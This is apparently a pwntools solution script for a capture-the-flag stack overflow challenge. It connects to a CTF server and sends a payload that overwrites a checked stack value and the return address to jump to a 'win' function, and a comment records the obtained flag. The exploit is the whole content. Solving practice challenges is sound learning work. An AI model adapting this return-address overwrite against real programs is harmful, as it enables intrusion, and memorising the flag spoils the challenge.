from pwn import *

exe = context.binary = ELF('ret')

winaddr = exe.symbols['win']

io = remote('ctf.hackucf.org', 9003)

payload = fit({
    64:0xdeadbeef,  # number above buffer that if() is looking for 
    80:winaddr, # address of win 0x080491f6
})

io.sendline(payload)
io.interactive()

# flag{no_you_suck!:P}